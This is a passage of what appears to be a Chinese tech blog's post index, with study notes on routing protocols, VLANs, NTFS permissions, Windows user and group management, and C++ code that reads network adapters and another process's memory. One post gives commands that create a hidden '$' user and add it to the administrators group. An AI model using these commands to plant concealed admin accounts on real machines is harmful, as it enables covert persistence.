不支持可变长子网掩码，使用广播更新\n\n  - RIP 2 使用组播更新\n\n  - 跳数限制15跳\n\n  - 不能划分区域，网络收敛慢\n\n    \n\n  - OSPF 使用组播更新\n\n  - 网络收敛快，通过区域划分\n\n  - 支持可变长子网掩码，携带子网掩码\n\n- ospf 配置\n\n  ```\n  route ospf 10\n  netword 192.168.10.0 0.0.0.255 area 0\n  192.168.10.0 宣告的网段 0.0.0.255 反码  area 表示宣告的区域\n  show ip ospf  查看ospf 基本配置信息\n  show ip ospf neighbor  查看邻接关系\n  ```\n\n- ospf 多区域概念\n\n  - 目的  实现大型网络环境，实现单区域网络快速收敛，改善网络，减小路由表\n  \n  - 通信\n    - 域内通信量\n    - 域外通信量- ABR\n    - 外部通信量-与其他自治系统  ASBR\n  \n  - 区域\n    - 骨干区域\n    - 非骨干区域\n      - 标准区域\n      - 末梢区域\n      - 完全末梢\n      - 非纯末梢\n  \n  - OSPF 高级配置\n  \n    - 路由重分发\n  \n      在大型网络中，可能在同一网络中用到多种路由协议，为了协同工作，路由器通过路由重分发将其学习到的一种路由协议的路由通过另一种路由协议广播出去。\n  \n    - NSSA\n  \n      非纯末梢区域，在此区域内会有一个ASBR路由器，需要在ASBR上配置重分发\n    \n      - 多了一种类型LSA，类型7LSA在一个  NSSA区域内携带外部信息\n      - 在NSSA的ABR上转换位5LSA \n      - N1 N2类型\n      - 通过NSSA的ABR之后转换为E1、E2  \n    \n    - 虚链路\n    \n      - 在两台ABR之间建立，穿越一个非骨干区域 \n","tags":["系统基础"],"categories":["系统基础"]},{"title":"热备份路由选择协议","url":"/2023/03/10/系统基础/热备份路由选择协议_new/","content":"\n\n## HSRP（热备份路由选择协议）\n\n### 目标\n\n1、了解HSRP的相关概念\n\n2、理解工作原理\n\n3、配置\n\n#### 一、概念\n\n1、成员\n\n- 活跃路由器\n- 备份路由器\n- 虚拟路由器\n- 其他路由器\n\n2、虚拟MAC地址\n\n- ４８位包括前２４　厂商编码，后２４位序列号\n- 后24位包括固定值07AC+HSRP组号\n\n3、HSRP 消息\n\n- UDP协议，端口号1985\n- 组播模式 224.0.0.2\n- 生命周期 TTL=1\n\n#### 二、工作原理\n\n如下，主机要访问外网，将数据交给自己的网关，在这里主机配置的网关是HSRP组中的虚拟路由器，虚拟路由器收到数据后，根据HSRP组中的机制，将数据交给活跃的路由器进行转发，活跃路路由器根据自身路由表进行转发数据。\n\n\n\n![image-20240222224025389](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20240222224025389.png)\n\n- 设置组号（决定虚拟路由器的MAC地址）\n- 优先级\n- 占先\n\n","tags":["系统基础"],"categories":["系统基础"]},{"title":"路由器相关知识","url":"/2023/03/09/系统基础/路由器相关知识_new/","content":"\n\n1、路由器相关知识\n\n- 三层设备\n- 网络层功能\n  - 逻辑地址寻址，实现不同网络直接的路径选择\n  - 查找目的是否可达，可达则选择最优路径\n\n- 网络层传输的是PDU ,IP数据包\n\n2、IP数据包的格式\n\n- IPV4 数据包格式 \n\n  ![image-20230309102043979](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230309102043979.png)\n\n3、路由器的工作原理\n\n- 路由\n  - 从源主机到目标主机的转发过程\n  - 包含两个内容\n    - 确定最佳路径（手动绑定，根据动态路由协商方式）\n    - 通过网络传输信息\n\n- 路由表\n  - 直接路由：当路由器的接口配置好对应的IP地址并开启接口后自动生成 \n  - 非直接路由：需要手动配置静态路由或者使用动态路由协议学习\n\n4、静态路由\n\n- 管理员配置、不灵活\n\n- 特殊的静态路由：默认路由\n\n  - 使用场景：一般应用于末节网络\n\n  ```powershell\n  ip route 目标网络 下一跳地址或者接口\n  ip route 192.168.10.0 255.255.255.0 192.168.30.2\n  ip route 192.168.10.0 255.255.255.0 f0/1\n  ```\n\n  \n\n5、动态路由\n\n- 通过某种动态路由协议自动的去建立自己的路由表\n- 常见的动态路由协议，RIP OSPF\n\n6、路由器转发数据\n\n源IP和目的IP一直不发生变化，源MAC地址和目的MAC地址一直在发生变化，路由器不断进行2层封装\n\n同网段传输主要是二层转发，不需要重新封装\n\n跨网段传输主要是三层转发，需要重新封装\n\n7、 VLAN\n\n把同一个网段的主机划分到不同的广播域，不能再简单的进行二层通信了，在同一交换机下，不同vlan不能直接通信了\n\n- 划分的目的\n\n  - 划分广播域\n\n  - 增强安全性\n\n  - 简化管理\n\n- 种类\n\n  - 静态划分\n\n    基于端口进行划分，需要去配置\n\n    华为路由器 1-4094 端口范围\n\n  - 动态划分\n\n    基于MAC地址自动加入\n\n- VLUN TRUNK\n  - 实现相同VLAN跨交换机通信\n  - 配置接口模式为Trunk模式\n\n\n\n8、不同VLAN直接的通信技术\n\n- 单臂路由(路由器压力大，容易造成网络拥堵)\n  - 在路由器上划分子接口作为不同vlan的网关,例如g/0 物理接口划分为g/0.1 g/0.2\n  - 主机与交换机-access\n  - 交换机和路由器--Trunk\n- 三层交换 ","tags":["系统基础"],"categories":["系统基础"]},{"title":"交换机的工作原理","url":"/2023/03/08/系统基础/交换机的工作原理_new/","content":"\n\n\n\n1、数据链路层设备，传输数据帧，封装MAC头部，源MAC地址，目的MAC地址\n\n2、数据链路层的功能\n\n- 建立逻辑连接，进行物理地址寻址，差错校验\n- 数据链路的建立，维护和拆除\n- 数据帧的封装、传输、同步、差错校验、流量控制\n\n3、以太网\n\n  以太网== 局域网\n\n- 有线局域网\n- 无线局域网\n\n4、交换机==默认以太网交换机\n\n5、MAC地址\n\n- 用于标识以太网商的某个设备\n- 以太网中通信需要MAC地址\n\n6、以太网的帧格式\n\n![image-20230308233126335](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230308233126335.png)\n\n7、以太网交换机\n\n- 早期共享式交换机-集线器\n  - 一个冲突域的网络\n- 交换式网络\n  - 广播\n  - 数据转发流程，A往B转发，交换机接受到A发来的数据帧后会检查MAC表中是否存在端口和MAC地址的对应关系，没有则不补上，随后查看目的MAC地址，如果不存在则广播，B收到后回应，其他的收到后丢弃，随后以单播方式通信。 \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["系统基础"],"categories":["系统基础"]},{"title":"注册表相关修改小技巧","url":"/2023/03/04/杂学/注册表相关修改小技巧/","content":"\n\n\n\n1、去除快捷方式左下角的小箭头\n\nHKEY—CLASS_ROOT\\lnkfile  Isshortcut 删除\n\n2、禁用注册表\n\nHKCU\\software\\microsoft\\windows\\currentversion\\policies\\system [DisableRegistrytools]:1\n\n3、禁用状态下，如何恢复\n\nRegistry WorkShop 来打开，改写禁用注册表的项\n\n","tags":["杂学"],"categories":["杂学"]},{"title":"NTFS 权限规则","url":"/2023/03/04/系统基础/NTFS 权限规则_new/","content":"\n\nNTFS 权限规则\n\n一、权限规则\n\n1. 权限的累加\n\n   - 用户分配的有效权限是分配给用户所有权限的累加\n\n     用户被分配的权限+所属组的权限\n\n2. 拒绝权限\n\n   - 拒绝的权限大于一切（在访问控制列表中，权限最高）\n   - 出现权限冲突时，拒绝的权限优先级最高（用户所属组读取权限，用户拒绝读取，最终是拒绝读取权限）\n\n3. 继承权限\n\n   - 文件或者文件夹默认集成上级文件夹的权限\n\n4. 特殊权限\n\n   - 读取权限（和读取文件或者文件夹的内容无关）\n\n     - 读取文件或者文件夹的访问控制列表  ，没有读取权限，点击文件-属性-安全，看不到ACL\n     - 访问文件的内容，此权限必须勾选\n\n   - 更改权限（和修改文件、修改文件夹的内容无关）\n\n     - 用户是否可以修改文件或者文件夹的访问控制列表，此权限可以为用户添加或者删除权限，会造成很多不安全因素，一般不给用户\n     - 更改的前提是读取权限\n\n   - 取得所有权\n\n     - 能够修改文件或者文件夹的所有者\n\n     - 前提是读取和更改","tags":["系统基础"],"categories":["系统基础"]},{"title":"NTFS权限","url":"/2023/03/04/系统基础/NTFS权限_new/","content":"\n\nNTFS权限\n\n一、 NTFS权限\n\n1. 文件系统\n\n   - windows\n\n     - 早期windows使用FAT16，FAT32\n     - NTFS\n       - ACL（访问控制列表）\n       - EFS(加密文件系统) BitLocker\n       - 压缩及磁盘配额\n\n     - ReFS  winserver2012\n\n   - Linux\n\n     - swap:交换文件系统，主要将磁盘的一部分空间划分给内存使用\n     - ext3/ext4\n\n   可以用convert命令在不格式化的前提下，修改文件系统\n\n   ```\n   convert H:/fs:ntfs   //H 是盘符\n   ```\n\n   \n\n二、文件权限\n\n设置文件权限\n- 读取数据\n- 写入数据\n- 附加数据\n- 删除\n- 执行\n\n三、文件夹权限\n\n1. 设置文件夹权限\n\n- 列出文件夹\n- 创建文佳佳\n- 创建文件\n- 删除\n- 删除子文件夹和文件\n\n四、权限的分类\n\n- 完全控制\n- 修改\n- 读取和执行\n- 读取\n- 写入\n- 特殊权限   -读取权限 更改权限  取得所有权","tags":["系统基础"],"categories":["系统基础"]},{"title":"windows 文件共享","url":"/2023/03/04/系统基础/windows 文件共享_new/","content":"\n\nwindows 文件共享\n\n一、共享要求\n\n一般是局域网使用\n\n1、物理上处于同一局域网\n\n- 同一公司的网络\n- 同一家庭的网络\n- 同一个手机热点\n\n2、逻辑上处于同一局域网\n\n- 直接可以ping 对方主机\n\n二、共享权限\n\n1、共享权限\n\n- everyone完全控制\n\n2、NTFS权限\n\n- 根据用户来的\n\n3、用户从网络访问server的最终权限\n\n- 共享权限和NTFS权限的交集\n\n三、访问共享\n\n```powershell\n\\\\server_address\n\\\\主机名\n```\n\n- 输入用户名和密码\n\n  ","tags":["系统基础"],"categories":["系统基础"]},{"title":"windows 用户管理","url":"/2023/03/04/系统基础/windows 用户管理_new/","content":"\n\nwindows 用户管理\n\n一. 用户账户\n\n1. 什么是用户账户\n\n   - 不同的用户身份拥有不同的权限\n\n   - 每个用户包含了一个名称和密码\n\n   - 每个用户账户具有唯一的安全标识符号 SID\n\n   - 查看系统中的用户\n\n     ```powershell\n     net user\n     ```\n\n   - 查看SID\n\n     - 命令查看\n\n     ```powershell\n     whoami /user\n     wmic useraccount get name,sid\n     ```\n\n     - 注册表查看SID\n\n       计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\\n\n2. 进行用户管理\n\n   - 创建用户\n\n     - 用户名：系统的显示名\n\n     - 全名：用户登录时的显示名\n\n     - 密码：server版本有密码复杂性要求，本地安全策略\n\n     - 账户已锁定：如果开启账户锁定阈值，账户有可能输错多次被锁定\n\n       ```\n       # 创建用户不指定密码\n       net user 用户名 /add\n       # 创建用户指定明文密码\n       net user 用户名 密码 /add\n       # 创建用户，手动输入密码\n       net user 用户名 /add *\n       ```\n\n   - 管理用户\n\n   - 设置密码\n\n   - 隐藏用户\n\n     ```powershell\n     # net user 查看不到 wmic useraccount get name,sid ,以及计算机管理里面可以看到\n     net user 用户名$ 密码 /add\n     ```\n\n     ```powershell\n     # 添加隐藏用户并提升为管理员权限\n     net localgroup administrators 用户名 /add\n     ```\n\n   二 、windows的内置用户\n\n   1、与使用者关联的\n\n   - 管理员：administrator使用者中具有最高的权限,没有其他管理员的情况下，不建议禁用\n   - 普通用户：具有一定的读取权限，权限较低\n   - 来宾用户：提供给访客使用，默认为禁用，权限最低\n\n   2、与windows 组件相关\n\n   - system 本地系统：拥有最高权限\n   - local service 本地服务  :权限相对于普通用户组user 低一些\n   - netword service 网络服务：权限跟普通用户组user 一样","tags":["系统基础"],"categories":["系统基础"]},{"title":"windows 组的管理","url":"/2023/03/04/系统基础/windows 组的管理_new/","content":"\n\nwindows 组的管理\n\n一、用户组\n\n 1. 概念\n\n    一组用户的集合，组中所有的用户具备组的权限\n\n 2. 管理组\n\n    ```powershell\n    # 新建组\n    net localgroup 组名 /add\n    # 删除组\n    net localgroup 组名 /del\n    # 添加成员到组\n    net localgroup 组名 成员 /add\n    # 把用户从组里删除\n    net localgroup 组名 成员 /del\n    ```\n\n二、内置组用户\n\n   \t1. 需要认为添加的\n   \t   - administrators:管理员组\n   \t   - guests:来宾用户组\n   \t   - power users:向下兼容的组\n   \t   - users:标准用户组，创建用户后默认属于该组\n   \t2. 动态包含成员\n   \t   - interactive:动态包含在本地登录的用户\n   \t   - authenticated users:动态包含通过验证的用户\n   \t   - everyone:所有人，包含了来宾用户","tags":["系统基础"],"categories":["系统基础"]},{"title":"本地安全策略大纲","url":"/2023/03/04/系统基础/本地安全策略_new/","content":"\n\n本地安全策略大纲\n\n一、本地安全策略基本内容\n\n1、概念\n\n- 主要对登录到计算机的账户进行一些安全设置\n- 主要是影响本地计算机的安全\n\n2、打开方式\n\n- 开始菜单-管理工具-本地安全策略\n\n- 使用命令\n\n  ```powershell\n  secpol.msc\t\n  ```\n\n- 从本地组策略进去\n\n  ```powershell\n  gpedit.msc\n  ```\n\n二、账户策略\n\n1、密码策略\n\n- 密码必须符合复杂性要求\n\n2、账户锁定策略\n\n- 账户锁定时间\n- 账户锁定阈值\n- 重置账户锁定计数器的时间\n- 管理员不受限制----注册表隐藏管理员账户，从而无法实施爆破\n\n三、本地策略\n\n- 审核策略\n- 用户权限分配\n- 安全选项\n\n  ","tags":["系统基础"],"categories":["系统基础"]},{"title":"计算机网络五层协议","url":"/2023/03/04/系统基础/计算机网络五层协议/","content":"\n\n\n应用层： 将原始数据转换为计算机的二进制，HTTP，FTP，SMTP\n\n传输层：将报文划分成较小的块，然后为每块加上传输层首部来生成传输层报文段。代表是TCP，UDP协议\n\n网络层：进行逻辑地址寻址，进行IP头部的封装，主要的字段，源IP和目的IP。\n\n数据链路层：建立逻辑链接，进行物理地址寻址，主要的字段源MAC地址，目的MAC地址\n\n物理层：将二进制数据转换为电信号通过网卡通过网线进行传输。\n\n\n\n![img](https://iknow-pic.cdn.bcebos.com/359b033b5bb5c9ea4701c08fda39b6003bf3b3e8)\n\n","tags":["系统基础"],"categories":["系统基础"]},{"title":"ubuntu 无法安装软件","url":"/2018/04/12/杂学/ubuntu 无法安装软件/","content":"\n### 问题描述  \napt-get install package 时出现以下问题\n\nE: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable)\nE: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it?\n\n\n### 解决办法： \n sudo rm /var/lib/dpkg/lock\n sudo dpkg --configure -a","tags":["杂学"],"categories":["杂学"]},{"title":"windows 更新以后无法定位msvcp_win.dll","url":"/2018/04/12/杂学/windows 更新以后无法定位msvcp_win.dll/","content":"\n### 问题描述：\n\nwin10更新以后出现 无法定位程序输入点_uncaught_exceptions 于动态链接库 C:\\windows\\system32\\msvcp_win.dll上。\n\n### 解决办法：\n\n命令行下：输入sfc /scannow\n\n","tags":["杂学"],"categories":["杂学"]},{"title":"windows 编程获取网卡和ip","url":"/2018/04/12/编程/windows 编程获取网卡和ip/","content":"\n一台机器上可能不只有一个网卡，但每一个网卡只有一个MAC地址，而每一个网卡可能配置有多个IP地址；如平常的笔记本电脑中，就会有无线网卡和有线网卡（网线接口）两种；因此，如果要获得本机所有网卡的IP和MAC地址信息，则必须顺序获得每个网卡，再依次获取其信息等；在windows sdk中，用IP\\_ADAPTER\\_INFO结构体存储网卡信息，包括网卡名、网卡描述、网卡MAC地址、网卡IP等，该结构体的主要描述如下所示：\n\n    \t\t\ttypedef struct _IP_ADAPTER_INFO {\n    \t\t\tstruct _IP_ADAPTER_INFO* Next;//指向链表中下一个适配器信息的指针\n    \t\t\tDWORD ComboIndex;//预留值\n    \t\t\tchar AdapterName[MAX_ADAPTER_NAME_LENGTH + 4];//使用ANSI字符串表示的适配器名称\n    \t\t\tchar Description[MAX_ADAPTER_DESCRIPTION_LENGTH + 4];//使用ANSI字符串表示的适配器描述\n    \t\t\tUINT AddressLength;//适配器硬件地址以字节计算的长度\n    \t\t\tBYTE Address[MAX_ADAPTER_ADDRESS_LENGTH];//硬件地址以BYTE数组所表示\n    \t\t\tDWORD Index;//适配器索引\n    \t\t\t\t\tUINT Type;//适配器类型,主要有以下几种：\n    \t\t\t\t\t/*\n    \t\t\t\t\t*   MIB_IF_TYPE_OTHER     1\n    \t\t\t\t\t*   MIB_IF_TYPE_ETHERNET     6\n    \t\t\t\t\t*   MIB_IF_TYPE_TOKENRING     9\n    \t\t\t\t\t*   MIB_IF_TYPE_FDDI     15\n    \t\t\t\t\t*   MIB_IF_TYPE_PPP     23\n    \t\t\t\t\t*   MIB_IF_TYPE_LOOPBACK      24\n    \t\t\t\t\t*   MIB_IF_TYPE_SLIP      28\n    \t\t\t\t\t*/\n    \t\t\tUINT DhcpEnabled;//指定这个适配器是否开启DHCP\n    \t\t\tPIP_ADDR_STRING CurrentIpAddress;//预留值\n    \t\t\tIP_ADDR_STRING IpAddressList;//该适配器的IPv4地址链表\n    \t\t\tIP_ADDR_STRING GatewayList;//该适配器的网关IPv4地址链表\n    \t\t\tIP_ADDR_STRING DhcpServer;//该适配器的DHCP服务器的IPv4 地址链表\n    \t\t\tBOOL HaveWins;\n    \t\t\tIP_ADDR_STRING PrimaryWinsServer;\n    \t\t\tIP_ADDR_STRING SecondaryWinsServer;\n    \t\t\ttime_t LeaseObtained;\n    \t\t\ttime_t LeaseExpires;\n    \t\t\t} IP_ADAPTER_INFO,*PIP_ADAPTER_INFO;\n    \n    由于可能有多个网卡，因此struct _IP_ADAPTER_INFO* Next字段为一个链表结构指针，由于一个网卡可能有多个IP，因此IP_ADDR_STRING字段应该也是一个链表结构，其信息如下所示：\n    \n    \ttypedef struct _IP_ADDR_STRING\n    \t{\n    \t\t\tstruct _IP_ADDR_STRING* Next;  //指向同类型节点，即下一个IP（如果有多IP的话）\n    \t\t\tIP_ADDRESS_STRING IpAddress;  //IP地址信息\n    \t\t\tIP_MASK_STRING IpMask; //IP子网掩码\n    \t\t\tDWORD Context;// 网络表入口。这个值对应着AddIPAddredd和DeleteIPAddress函数中的NTEContext参数\n    \t} IP_ADDR_STRING;\n\n在基本了解以上信息后，就可以调用GetAdaptersInfo函数来获取相关网卡信息了，其通用的代码如下所示：\n\n    \t\t\t\t\t#include <WinSock2.h>\n    \t\t\t\t\t#include <Iphlpapi.h>\n    \t\t\t\t\t#include <iostream>\n    \t\t\t\t\tusing namespace std;\n    \t\t\t\t\t#pragma comment(lib,\"Iphlpapi.lib\") //需要添加Iphlpapi.lib库\n    \t\t\t\t\tint main(int argc, char* argv[])\n    \t\t\t\t\t{\n    \t\t\t\t\t\t\t//PIP_ADAPTER_INFO结构体指针存储本机网卡信息\n    \t\t\t\t\t\t\tPIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();\n    \t\t\t\t\t\t\t//得到结构体大小,用于GetAdaptersInfo参数\n    \t\t\t\t\t\t\tunsigned long stSize = sizeof(IP_ADAPTER_INFO);\n    \t\t\t\t\t\t\t//调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量\n    \t\t\t\t\t\t\tint nRel = GetAdaptersInfo(pIpAdapterInfo,&stSize);\n    \t\t\t\t\t\t\t//记录网卡数量\n    \t\t\t\t\t\t\tint netCardNum = 0;\n    \t\t\t\t\t\t\t//记录每张网卡上的IP地址数量\n    \t\t\t\t\t\t\tint IPnumPerNetCard = 0;\n    \t\t\t\t\t\t\tif (ERROR_BUFFER_OVERFLOW == nRel)\n    \t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\t//如果函数返回的是ERROR_BUFFER_OVERFLOW\n    \t\t\t\t\t\t\t\t\t//则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小\n    \t\t\t\t\t\t\t\t\t//这也是说明为什么stSize既是一个输入量也是一个输出量\n    \t\t\t\t\t\t\t\t\t//释放原来的内存空间\n    \t\t\t\t\t\t\t\t\tdelete pIpAdapterInfo;\n    \t\t\t\t\t\t\t\t\t//重新申请内存空间用来存储所有网卡信息\n    \t\t\t\t\t\t\t\t\tpIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];\n    \t\t\t\t\t\t\t\t\t//再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量\n    \t\t\t\t\t\t\t\t\tnRel=GetAdaptersInfo(pIpAdapterInfo,&stSize);    \n    \t\t\t\t\t\t\t}\n    \t\t\t\t\t\t\tif (ERROR_SUCCESS == nRel)\n    \t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\t//输出网卡信息\n    \t\t\t\t\t\t\t\t\t//可能有多网卡,因此通过循环去判断\n    \t\t\t\t\t\t\twhile (pIpAdapterInfo)\n    \t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\tcout<<\"网卡数量：\"<<++netCardNum<<endl;\n    \t\t\t\t\t\t\t\t\tcout<<\"网卡名称：\"<<pIpAdapterInfo->AdapterName<<endl;\n    \t\t\t\t\t\t\t\t\tcout<<\"网卡描述：\"<<pIpAdapterInfo->Description<<endl;\n    \t\t\t\t\t\t\t\t\tswitch(pIpAdapterInfo->Type)\n    \t\t\t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_OTHER:\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"OTHER\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_ETHERNET:\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"ETHERNET\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_TOKENRING:\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"TOKENRING\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_FDDI:\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"FDDI\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_PPP:\n    \t\t\t\t\t\t\t\t\t\t\tprintf(\"PP\\n\");\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"PPP\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_LOOPBACK:\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"LOOPBACK\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tcase MIB_IF_TYPE_SLIP:\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡类型：\"<<\"SLIP\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\tdefault:\n    \t\t\t\t\tbreak;\n    \t\t\t\t\t\t\t\t\t}\n    \t\t\t\t\t\t\t\t\tcout<<\"网卡MAC地址：\";\n    \t\t\t\t\t\t\t\t\tfor (DWORD i = 0; i < pIpAdapterInfo->AddressLength; i++)\n    \t\t\t\t\t\t\t\t\t\t\tif (i < pIpAdapterInfo->AddressLength-1)\n    \t\t\t\t\t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\t\t\t\t\tprintf(\"%02X-\", pIpAdapterInfo->Address[i]);\n    \t\t\t\t\t\t\t\t\t\t\t}\n    \t\t\t\t\t\t\t\t\t\t\telse\n    \t\t\t\t\t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\t\t\t\t\tprintf(\"%02X\\n\", pIpAdapterInfo->Address[i]);\n    \t\t\t\t\t\t\t\t\t\t\t}\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"网卡IP地址如下：\"<<endl;\n    \t\t\t\t\t\t\t\t\t\t\t//可能网卡有多IP,因此通过循环去判断\n    \t\t\t\t\t\t\t\t\t\t\tIP_ADDR_STRING *pIpAddrString =&(pIpAdapterInfo->IpAddressList);\n    \t\t\t\t\t\t\t\t\t\t\tdo \n    \t\t\t\t\t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\t\t\t\t\tcout<<\"该网卡上的IP数量：\"<<++IPnumPerNetCard<<endl;\n    \t\t\t\t\t\t\t\t\t\t\t\t\tcout<<\"IP 地址：\"<<pIpAddrString->IpAddress.String<<endl;\n    \t\t\t\t\t\t\t\t\t\t\t\t\tcout<<\"子网地址：\"<<pIpAddrString->IpMask.String<<endl;\n    \t\t\t\t\t\t\t\t\t\t\t\t\tcout<<\"网关地址：\"<<pIpAdapterInfo->GatewayList.IpAddress.String<<endl;\n    \t\t\t\t\t\t\t\t\t\t\t\t\tpIpAddrString=pIpAddrString->Next;\n    \t\t\t\t\t\t\t\t\t\t\t} while (pIpAddrString);\n    \t\t\t\t\t\t\t\t\t\t\tpIpAdapterInfo = pIpAdapterInfo->Next;\n    \t\t\t\t\t\t\t\t\t\t\tcout<<\"--------------------------------------------------------------------\"<<endl;\n    \t\t\t\t\t\t\t}\n    \t\t\t\t\t\t\t\n    \t\t\t\t\t\t\t}\n    \t\t\t\t\t\t\t//释放内存空间\n    \t\t\t\t\t\t\tif (pIpAdapterInfo)\n    \t\t\t\t\t\t\t{\n    \t\t\t\t\t\t\t\t\tdelete pIpAdapterInfo;\n    \t\t\t\t\t\t\t}\n    \t\t\t\t\t\n    \t\t\t\t\t\t\treturn 0;\n    \t\t\t\t\t}","tags":["编程"],"categories":["编程"]},{"title":"获取打开文件的全路径（1）","url":"/2018/04/12/编程/获取打开的文件的全路径（1）/","content":"\n#### 1、获取打开文件的全路径（1）\n\n方法：获取进程PEB中的命令行参数信息（问题：如果先打开文件比如word.exe再打开文件，会出现获取不到的情况）\n步骤：\n\n- ##### 遍历进程获取打开文件的可执行文件的进程\n\n\n\tHANDLE hSnapProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tif (hSnapProcess == INVALID_HANDLE_VALUE)\n\t{\n\t\treturn;\n\t}\n\tPROCESSENTRY32W ProcessEntry;\n\tProcessEntry.dwSize = sizeof(ProcessEntry);\n\tBOOL bret = Process32FirstW(hSnapProcess, &ProcessEntry);\n\tWCHAR wszProcessInfo[MAX_PATH] = { 0 };\n\t\n\tdo\n\t{\n\t\tWCHAR Name[MAX_PATH] = { 0 };\n\t\n\t    if (!lstrcmp(ProcessEntry.szExeFile, L\"POWERPNT.EXE\")| !lstrcmp(ProcessEntry.szExeFile, L\"WINWORD.EXE\"))\n\t\t{\n\t\t\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessEntry.th32ProcessID);\n\t\t\tdo something\n\t\t\tCloseHandle(hProcess);\n\t\t\n\t\t}\n\t\n\t} while (Process32NextW(hSnapProcess, &ProcessEntry));\n\n-  ##### 利用ntdll.dll中一个未公开的函数NtQueryInformationProcess，获取进程信息然后去读对方进程ReadProcessMemory,函数原型如下：\n\n\n\tNTSTATUS WINAPI NtQueryInformationProcess(\n\t  _In_      HANDLE           ProcessHandle,\n\t  _In_      PROCESSINFOCLASS ProcessInformationClass,\n\t  _Out_     PVOID            ProcessInformation,\n\t  _In_      ULONG            ProcessInformationLength,\n\t  _Out_opt_ PULONG           ReturnLength\n\t);\n\n第一个参数是进程句柄，第二个参数是获取的进程的信息类型，这里我们选择ProcessBasicInformation,\nmsdn 的声明如下，会返回一个PEB结构体。\n\n![image-20230704222649697](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230704222649697.png)\n\n第三个参数是输出参数，当参数2是ProcessBasicInformation时，会返回一个\nPROCESS_BASIC_INFORMATION 结构，结构如下，\n\n![image-20230704222723161](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230704222723161.png)\n\n\n\tstatus = NtQueryInformationProcess(hProcess,\n\t\t\t\t\tProcessBasicInformation,\n\t\t\t\t\t&pbi,\n\t\t\t\t\tsizeof(PROCESS_BASIC_INFORMATION),\n\t\t\t\t\t&ReturnLength);\n- #####  获取到PROCESS_BASIC_INFORMATION结构体以后，由上可以看出的它的第二个成员就是指向进程PEB结构体的指针，此时调用ReadProcessMemory，获取进程PEB，\n\n\n \tReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), 0)  ReadProcessMemory的函数原型如下：\n \t \n \tBOOL WINAPI ReadProcessMemory(\n \t  _In_  HANDLE  hProcess,\n \t  _In_  LPCVOID lpBaseAddress,\n \t  _Out_ LPVOID  lpBuffer,\n \t  _In_  SIZE_T  nSize,\n \t  _Out_ SIZE_T  *lpNumberOfBytesRead\n \t);\n\n- \n  ##### 通过ReadProcessMemory 获取进程的PEB以后，PEB的结构如下：\n\n\n\ttypedef struct _PEB {\n\t\tBOOLEAN                 InheritedAddressSpace;\n\t\tBOOLEAN                 ReadImageFileExecOptions;\n\t\tBOOLEAN                 BeingDebugged;\n\t\tBOOLEAN                 Spare;\n\t\tHANDLE                  Mutant;\n\t\tPVOID                   ImageBaseAddress;\n\t\tPPEB_LDR_DATA           LoaderData;\n\t\tPRTL_USER_PROCESS_PARAMETERS ProcessParameters;\n\t\tPVOID                   SubSystemData;\n\t\tPVOID                   ProcessHeap;\n\t\tPVOID                   FastPebLock;\n\t\tPPEBLOCKROUTINE         FastPebLockRoutine;\n\t\tPPEBLOCKROUTINE         FastPebUnlockRoutine;\n\t\tULONG                   EnvironmentUpdateCount;\n\t\tPVOID*                  KernelCallbackTable;\n\t\tPVOID                   EventLogSection;\n\t\tPVOID                   EventLog;\n\t\tPPEB_FREE_BLOCK         FreeList;\n\t\tULONG                   TlsExpansionCounter;\n\t\tPVOID                   TlsBitmap;\n\t\tULONG                   TlsBitmapBits[0x2];\n\t\tPVOID                   ReadOnlySharedMemoryBase;\n\t\tPVOID                   